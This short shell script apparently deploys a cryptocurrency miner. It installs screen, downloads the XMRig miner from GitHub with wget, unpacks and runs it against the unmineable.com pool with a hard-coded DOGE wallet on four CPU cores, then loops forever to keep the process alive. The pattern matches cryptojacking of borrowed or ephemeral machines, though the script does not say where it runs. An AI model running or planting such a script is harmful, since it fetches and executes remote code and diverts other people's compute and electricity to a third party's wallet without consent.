#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:D9Mq2fXA4vBAqBr1zqv1F9cjViw5qF43iW.unmineable_worker_plkmjuxr#rup9-jjmz -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
